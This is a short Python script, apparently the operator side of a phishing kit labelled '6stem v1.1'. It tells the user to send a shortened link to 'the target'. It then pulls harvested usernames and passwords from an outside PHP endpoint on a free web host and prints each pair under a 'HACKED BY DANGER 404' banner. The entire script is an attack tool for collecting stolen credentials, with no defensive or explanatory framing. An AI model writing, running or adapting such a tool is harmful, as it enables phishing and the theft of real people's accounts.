
import requests
import json
import colorama
from colorama import Fore, Back, Style
import os
import time

os.system("clear")
time.sleep(2.5)
# init col
colorama.init()

#welcome
print(Fore.GREEN + "          [+] SEND THIS LINK TO THE TARGET")
print(Fore.RED + "               https://shorturl.at/lqtzS")
print()
print()
print()
opt = input("       PRESS ENTER TO CONTINUE")
os.system("clear")
time.sleep(1.5)
print(Fore.CYAN + "     ░█████╗░░██████╗████████╗███████╗███╗░░░███╗")
print(Fore.GREEN + "     ██╔═══╝░██╔════╝╚══██╔══╝██╔════╝████╗░████║")
print(Fore.WHITE + "     ██████╗░╚█████╗░░░░██║░░░█████╗░░██╔████╔██║")
print(Fore.YELLOW + "     ██╔══██╗░╚═══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║")
print(Fore.WHITE + "     ╚█████╔╝██████╔╝░░░██║░░░███████╗██║░╚═╝░██║")
print(Fore.GREEN + "     ░╚════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝")
print("                      6stem v1.1")
time.sleep(1.5)
print()
# URL of the PHP file
url = "https://paladinpal.000webhostapp.com/2.php"

# Make GET request to the PHP file
response = requests.get(url)

# Check if the request was successful
if response.status_code == 200:
    # Parse the JSON response
    data = response.json()

    # Loop through the data and print the username and password
    for item in data:
        print(Fore.GREEN + "        [+] HACKED BY DANGER 404")
        print()
        print("Username:", item["username"])
        print("Password:", item["password"])
        print("___________________________________")
        print()
        time.sleep(1.5)

else:
    print("Error:", response.status_code)
